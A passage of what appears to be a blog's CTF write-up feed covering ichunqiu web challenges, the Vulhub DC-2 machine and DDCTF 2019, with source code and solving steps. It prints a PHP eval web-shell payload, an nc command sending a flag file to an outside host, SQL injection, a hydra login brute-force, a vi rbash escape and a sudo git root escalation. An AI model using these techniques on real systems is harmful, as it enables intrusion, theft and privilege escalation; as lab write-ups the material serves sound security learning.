class="line"><span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br&gt;next ***.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>MYSQL 中 utf8_unicode_ci 和 utf8_general_ci 两种编码格式, utf8_general_ci不区分大小写,<br>Ä = A, Ö = O, Ü = U 这三种条件都成立, 对于utf8_general_ci下面的等式成立：ß = s<br>，但是，对于utf8_unicode_ci下面等式才成立：ß = ss 。<br>可以看到大写O和Ö是相等的</p>
</blockquote>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5211ec9dde53ee65bb02225117fba1e1.php?usern3me=Bctf2Ö16</span><br></pre></td></tr></table></figure>

<p>Got another source code</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'path'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>]))&#123;</span><br><span class="line">    $path = $_GET[<span class="string">'path'</span>];</span><br><span class="line">    $name = <span class="string">"upload/"</span>.$_GET[<span class="string">'filename'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strpos($name,<span class="string">'..'</span>) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'WTF'</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strpos($path,<span class="string">'http://127.0.0.1/'</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">    file_put_contents($name,file_get_contents($path));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'path error'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>With <code>http://127.0.0.1/</code> been detected, payloads like <code>http://127.0.0.1:test@www.baidu.com</code> can not be used. But we can utilize the page before , as it will show <code>usern3me</code> content on page</p>
<p><img src="https://user-images.githubusercontent.com/40637063/59102510-e1d0cf00-895e-11e9-9d95-66589f9ad9ee.png" alt="image"></p>
<p>so our last payload should be like:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://100a280ce70e4481b698495023409e196beeb4c27c204fdb.changame.ichunqiu.com/c3368f5eb5f8367fd548b228bee69ef2.php?path=http://127.0.0.1/5211ec9dde53ee65bb02225117fba1e1.php?usern3me=&lt;?php @eval($_POST[0]);&gt;&amp;filename=shell.php</span><br></pre></td></tr></table></figure>

<p>and call <code>shell.php</code>, Posting data like</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0=echo `cat ../flag_is_here.php`;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Ps: what if the filter condition was <strong><a href="http://127.0.0.1" target="_blank" rel="noopener">http://127.0.0.1</a></strong> instead of <strong><a href="http://127.0.0.1/" target="_blank" rel="noopener">http://127.0.0.1/</a></strong> ? Think about URL’s structure: <strong>scheme://user:pass@host:port/path?query=value#fragment</strong></p>
<p>Using payload <a href="http://127.0.0.1:test@www.baidu.com" target="_blank" rel="noopener">http://127.0.0.1:test@www.baidu.com</a> , you can bypass it and visit baidu.com.</p>
</blockquote>
<h2 id="ichunqiu-try"><a href="#ichunqiu-try" class="headerlink" title="ichunqiu try"></a>ichunqiu try</h2><p>to generate hash crash:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> crypt</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'1.txt'</span>,<span class="string">'w+'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">10000000</span>,<span class="number">40000000</span>):</span><br><span class="line">    f.write(str(i) + <span class="string">' '</span> + crypt.crypt(str(i), <span class="string">'$6$rounds=66'</span>))</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> crypt</span><br><span class="line"></span><br><span class="line">token_url = <span class="string">"http://902bdd4e83e54133a6f850f6b12c6e236da12c85e6dc43c9.changame.ichunqiu.com/level.php?name=%27%20union%20select%20token%20from%20token%23"</span></span><br><span class="line"></span><br><span class="line">reset_url = <span class="string">"http://902bdd4e83e54133a6f850f6b12c6e236da12c85e6dc43c9.changame.ichunqiu.com/reset.php"</span></span><br><span class="line"></span><br><span class="line">reset_data = &#123;</span><br><span class="line">        <span class="string">"username"</span>:<span class="string">"member"</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset_and_get_token</span><span class="params">()</span>:</span></span><br><span class="line">    requests.post(reset_url, data=reset_data)</span><br><span class="line">    res = requests.get(token_url).content</span><br><span class="line">    token = re.findall(<span class="string">r"level is (.*)"</span>, res)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        token = reset_and_get_token()</span><br><span class="line">        f = open(<span class="string">"1.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line">        lines = f.read()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            <span class="keyword">if</span> token <span class="keyword">in</span> line:</span><br><span class="line">                <span class="keyword">print</span> line</span><br><span class="line">                exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h2 id="ichunqiu-fuzzing"><a href="#ichunqiu-fuzzing" class="headerlink" title="ichunqiu fuzzing"></a>ichunqiu fuzzing</h2><p><code>hint: ip,Large internal network</code></p>
<p>trying <code>192.168.0.0</code> (or other ipsegment like <code>10.0.0.0</code>: ) with <code>client-ip</code> or <code>x-forwarded-for</code> …, , and the callback let us show the key,</p>
<blockquote>
<p> ps : several http headers to fake ip:</p>
<p>X-Forwarded-For</p>
<p>Client-ip</p>
<p>x-remote-ip</p>
<p>x-originating-IP</p>
<p>x-remote-addr</p>
</blockquote>
<p>right click in burpsuite’s repeater and change to request’s method , add <code>key</code> and send the request …..</p>
<p>…</p>
<p>…</p>
<p>finally we got the code as follows and a cipher.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function authcode($string, $operation = &apos;DECODE&apos;, $key = &apos;&apos;, $expiry = 0) &#123;</span><br><span class="line">	$ckey_length = 4;</span><br><span class="line"></span><br><span class="line">	$key = md5($key ? $key : UC_KEY);</span><br><span class="line">	$keya = md5(substr($key, 0, 16));</span><br><span class="line">	$keyb = md5(substr($key, 16, 16));</span><br><span class="line">	$keyc = $ckey_length ? ($operation == &apos;DECODE&apos; ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : &apos;&apos;;</span><br><span class="line"></span><br><span class="line">	$cryptkey = $keya . md5($keya . $keyc);</span><br><span class="line">	$key_length = strlen($cryptkey);</span><br><span class="line"></span><br><span class="line">	$string = $operation == &apos;DECODE&apos; ? base64_decode(substr($string, $ckey_length)) : sprintf(&apos;%010d&apos;, $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string;</span><br><span class="line">	$string_length = strlen($string);</span><br><span class="line"></span><br><span class="line">	$result = &apos;&apos;;</span><br><span class="line">	$box = range(0, 255);</span><br><span class="line"></span><br><span class="line">	$rndkey = array();</span><br><span class="line">	for ($i = 0; $i &lt;= 255; $i++) &#123;</span><br><span class="line">		$rndkey[$i] = ord($cryptkey[$i % $key_length]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	for ($j = $i = 0; $i &lt; 256; $i++) &#123;</span><br><span class="line">		$j = ($j + $box[$i] + $rndkey[$i]) % 256;</span><br><span class="line">		$tmp = $box[$i];</span><br><span class="line">		$box[$i] = $box[$j];</span><br><span class="line">		$box[$j] = $tmp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	for ($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123;</span><br><span class="line">		$a = ($a + 1) % 256;</span><br><span class="line">		$j = ($j + $box[$a]) % 256;</span><br><span class="line">		$tmp = $box[$a];</span><br><span class="line">		$box[$a] = $box[$j];</span><br><span class="line">		$box[$j] = $tmp;</span><br><span class="line">		$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if ($operation == &apos;DECODE&apos;) &#123;</span><br><span class="line">		if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) &#123;</span><br><span class="line">			return substr($result, 26);</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			return &apos;&apos;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		return $keyc . str_replace(&apos;=&apos;, &apos;&apos;, base64_encode($result));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">just decode it using function.</span><br><span class="line"></span><br><span class="line">## ichunqiu not found</span><br><span class="line"></span><br><span class="line">访问，抓包，看回显：</span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/57923178-21fadf80-78d4-11e9-88dd-179d35e9cc72.png)</span><br><span class="line"></span><br><span class="line">``X-method`` 显示haha，提示请求方法错误，尝试``POST`` ``OPTIONS`` ``HEAD`` 三种方法之后，看到``OPTIONS`` 的回显有``?f=1.php`` ：</span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/57923374-b5ccab80-78d4-11e9-8267-fb7d6bf0269a.png)</span><br><span class="line"></span><br><span class="line">带参数访问，可以看到1.php的源代码，但是访问不了flag.php 和index.php， </span><br><span class="line"></span><br><span class="line">``Apache`` 的根目录下常常有``.htaccess`` 文件。</span><br><span class="line"></span><br><span class="line">&gt; .htaccess文件(或者&quot;分布式配置文件&quot;)提供了针对每个目录改变配置的方法，即在一个特定的目录中放置一个包含指令的文件，其中的指令作用于此目录及其所有子目录。</span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/57924740-8455df00-78d8-11e9-946b-7107b2970485.png)</span><br><span class="line"></span><br><span class="line">然后访问下面的html，</span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/57924856-deef3b00-78d8-11e9-9cf7-05477e0c1ad7.png)</span><br><span class="line"></span><br><span class="line">添加``x-forwarded-for: 127.0.0.1`` 无效，用``client-ip: 127.0.0.1`` 就可以了。</span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/57924816-c2530300-78d8-11e9-8199-23ffb61c4149.png)</span><br><span class="line"></span><br><span class="line">## ichunqiu exec</span><br><span class="line"></span><br><span class="line">查看源码提示``vim`` ，查看``.index.php.swp`` 并用vim恢复，得到以下代码</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line"> &lt;?php /* flag in flag233.php */  </span><br><span class="line">     function check($number) &#123;</span><br><span class="line">     $one = ord(&apos;1&apos;);</span><br><span class="line">     $nine = ord(&apos;9&apos;);</span><br><span class="line">     for ($i = 0; $i &lt; strlen($number); $i++)</span><br><span class="line">     &#123;</span><br><span class="line">         $digit = ord($number&#123;$i&#125;);</span><br><span class="line">         if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">         &#123;</span><br><span class="line">             return false;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     return $number == &apos;11259375&apos;;</span><br><span class="line"> &#125;</span><br><span class="line">if(isset($_GET[sign])&amp;&amp; check($_GET[sign]))&#123;</span><br><span class="line">    setcookie(&apos;auth&apos;,&apos;tcp tunnel is forbidden!&apos;);</span><br><span class="line">    if(isset($_POST[&apos;cmd&apos;]))&#123;</span><br><span class="line">        $command=$_POST[cmd];</span><br><span class="line">        $result=exec($command);</span><br><span class="line">        //echo $result;</span><br><span class="line">    &#125; &#125;else&#123; 	die(&apos;no sign&apos;); &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这里要求传入数据弱等于’11259375’，但是数据的每一位都不能在0-9之间，那么可以传入<code>11259375</code>  的十六进制也就是<code>0xabcdef</code> ，然后执行cmd，但是代码中说不能执行<code>tcp</code> 的连接，那么采用<code>udp</code> 的方式进行连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd=nc -u xxx.xxx.xxx.xxx 1111 &lt; flag233.php</span><br></pre></td></tr></table></figure>

<p>服务器开启：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -ul 1111</span><br></pre></td></tr></table></figure>

<p><code>-u</code> 是开启udp模式的意思。</p>
<h2 id="ichunqiu百度杯-登录"><a href="#ichunqiu百度杯-登录" class="headerlink" title="ichunqiu百度杯 登录"></a>ichunqiu百度杯 登录</h2><p>前面内容和数据库有关。</p>
<p>登录进去之后看到有<code>.bctfg1t</code> 字段，像是<code>.git</code> 泄露，访问被403，访问<code>/.bctfg1t/config</code> 成功说明的确是git泄露，使用<code>Githack</code> 把全部内容下载下来。可以看见一些sh1字符串。</p>
<p>使用<code>git log</code> 查看历史版本，使用得到的<code>commit</code> 编号进行<code>git reset --hard {commit}</code> ，然而没有用。</p>
<p>考察<code>缓存机制</code> ，在<code>git</code> 中，缓存就是<code>stach</code> ，进入<code>.git/refs/</code> ，然后<code>cat stach</code> 得到了commit，回到下载的根目录执行<code>git reset --hard commit</code> 之后查看<code>flag.php</code> 就行了</p>
]]></content>
      <categories>
        <category>题型记录</category>
      </categories>
  </entry>
  <entry>
    <title>Vulhub-DC-2</title>
    <url>/2019/05/23/Vulhub-DC-2/</url>
    <content><![CDATA[<h2 id="DC-2-靶机渗透"><a href="#DC-2-靶机渗透" class="headerlink" title="DC-2 靶机渗透"></a>DC-2 靶机渗透</h2><p>复现不下去了来打打靶机，嘤嘤嘤<del>~</del></p>
<p>首先<code>arp-scan -l</code> 和<code>nmap -A -p- 172.28.15.94</code> 开路，参数A <code>Enable OS detection, version detection, script scanning, and traceroute</code> 。</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58260318-d00cfa80-7da8-11e9-8af5-c5fc585b160e.png" alt="image"></p>
<p>然后访问<code>http://dc-2</code> 访问不了，于是在<code>/etc/hosts</code> 中添加<code>dc-2    172.28.15.94</code> ，然后就可以访问了。</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58260265-bb306700-7da8-11e9-8270-83388ac493a0.png" alt="image"></p>
<p>看到了第一个<code>flag</code> ，提示说让使用工具<code>cewl</code> 这是一个通过爬取网页内容来生成password的工具。</p>
<p><code>cewl -w dc2_passwords.txt http://dc-2</code></p>
<p>经过<code>wpscan</code> 扫描之后可以看到三个用户名<code>jerry</code> <code>admin</code> <code>tom</code> ，尝试使用<code>hydra</code> 来爆破。</p>
<p><code>hydra -L dc-2_user.txt -P dc2_password.txt dc-2 http-form-post &#39;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&#39;</code></p>
<p>字符串里的东西以<code>:</code>为分隔符分成几个<code>hydra</code> 的参数，被<code>^</code> 包裹的是传参位置标志，S表示希望成功。</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58261191-6ee62680-7daa-11e9-8751-388384b1be62.png" alt="image"></p>
<p>发现了两个用户名的密码，然后在<code>/wp-login.php</code>下登录<code>jerry</code> 可以看到第二个flag。</p>
<p>尝试<code>ssh jerry@dc-2 -p</code> 失败，但是可以用<code>tom</code> 进行登录，进去之后使用<code>cd</code> 和<code>ls</code> 就会弹出<code>rbash</code> 的提示。但是可以使用<code>vi</code>命令，进入<code>vim</code> 之后以他为媒介执行命令<code>set shell=/bin/sh</code>以及<code>shell</code> ，就可以来到<code>sh</code> 环境下，配置环境变量<code>export PATH=/usr/sbin/:/usr/bin:/sbin:/bin</code> 之后就可以正常执行命令了，可以获得<code>flag3</code> 了。</p>
<p>最后就是提权了。</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58263410-81625f00-7dae-11e9-9664-e58db889bbe1.png" alt="image"></p>
<p>根据提示 <code>sudo -l</code>列出可以执行的<code>sudo</code>命令，但是失败了。。。尝试登陆<code>jerry</code> 账号成功并且拿到了<code>flag4.txt</code> 根据文件中最后的提示，执行一下<code>sudo -l</code> ，发现可以执行<code>git</code>命令，使用<code>sudo git help status</code> ，并在里面执行<code>!/bin/bash</code> ，这样就可以以<code>root</code>的权限来到bash了，提权成功。</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58263823-56c4d600-7daf-11e9-9b25-bb2b26e63a8a.png" alt="image"></p>
]]></content>
      <categories>
        <category>题型记录</category>
      </categories>
  </entry>
  <entry>
    <title>2019 DDCTF web </title>
    <url>/2019/05/11/2019-DDCTF-web/</url>
    <content><![CDATA[<h1 id="didictf-web-wp"><a href="#didictf-web-wp" class="headerlink" title="didictf web wp"></a>didictf web wp</h1><p>考试周结束，有时间来复现了。。。然鹅好像有题目崩了，java又没学过。。。只能复现一部分了。</p>
<h2 id="web-签到题"><a href="#web-签到题" class="headerlink" title="web 签到题"></a>web 签到题</h2><p>点击，扫描，发现除了index.php 之外其他都需要登陆，抓包发现有发送<code>Auth.php</code>请求，其中有<code>didictf_username</code>字段，尝试添加成为<code>didictf_username: admin</code>。成功登陆。</p>
<p>然后在返回包中显示出了一个<code>php文件</code>，尝试访问看到了<code>Session.php</code>的源代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $path = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span><span class="params">($data, $errMsg = <span class="string">'success'</span>)</span> </span>&#123;</span><br><span class="line">        $ret = [<span class="string">'errMsg'</span> =&gt; $errMsg,</span><br><span class="line">            <span class="string">'data'</span> =&gt; $data];</span><br><span class="line">        $ret = json_encode($ret);</span><br><span class="line">        header(<span class="string">'Content-type: application/json'</span>);</span><br><span class="line">        <span class="keyword">echo</span> $ret;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $DIDICTF_ADMIN = <span class="string">'admin'</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>] == $DIDICTF_ADMIN) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'抱歉，您没有登陆权限，请获取权限后访问-----'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    $path = trim($path);<span class="comment">//去掉空格</span></span><br><span class="line">    $path=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$path);<span class="comment">//过滤第一</span></span><br><span class="line">    $path=str_replace(<span class="string">'..\\'</span>,<span class="string">''</span>,$path);<span class="comment">//过滤第二</span></span><br><span class="line">    <span class="keyword">return</span> $path;</span><br><span class="line">&#125;<span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path);<span class="comment">// ....//config/flag.php</span></span><br><span class="line">        <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123;<span class="comment">//../config/flag.php</span></span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">'Congratulations'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'Application.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//key建议为8位字符串</span></span><br><span class="line">    <span class="keyword">var</span> $eancrykey                  = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_expiration			= <span class="number">7200</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_name                = <span class="string">'ddctf_id'</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_path				= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_domain				= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_secure				= <span class="keyword">FALSE</span>;</span><br><span class="line">    <span class="keyword">var</span> $activity                   = <span class="string">"DiDiCTF"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">parent</span>::auth()) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get_key();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123;</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you %s'</span>;</span><br><span class="line">                $data = sprintf($data,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;session_create();</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you'</span>;</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">'../config/key.txt'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span><span class="params">()</span> </span>&#123;<span class="comment">//target1: 绕过所有false</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE)) &#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;<span class="comment">//cookie not empty</span></span><br><span class="line"></span><br><span class="line">        $session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"session not found"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;<span class="comment">//ddctf_id 不能为空</span></span><br><span class="line"></span><br><span class="line">        $hash = substr($session,strlen($session)<span class="number">-32</span>);<span class="comment">//长度要大于32? 32位之后的内容</span></span><br><span class="line">        $session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);<span class="comment">//一直截断到倒数第32位</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;<span class="comment">//key.txt 内容和 ddctf_id 内容片段拼接 再md5 等于ddctf_id32位之后的内容</span></span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $session = unserialize($session);<span class="comment">//ddctf_id 反序列化</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;<span class="comment">//ddctf_id 反序列化之后的内容要有 session_id ip_address user_agent 再来个path??</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">            $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">                $data = sprintf($data,$v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">        &#125;<span class="comment">//sprint格式化打印函数利用，通过传递进参数nickname = %S 让它可以读取key。</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span>.<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;<span class="comment">//ip_address 要写自己的ip</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;<span class="comment">//user_agent 内容要和 http_user_agent的匹配</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="comment">//看起来可以动手脚的只有session_id?</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $sessionid = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123;</span><br><span class="line">            $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $userdata = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)),</span><br><span class="line">            <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</span><br><span class="line">            <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</span><br><span class="line">            <span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $cookiedata = serialize($</span><br><span class="line">    );</span><br><span class="line">        $cookiedata = $cookiedata.md5(<span 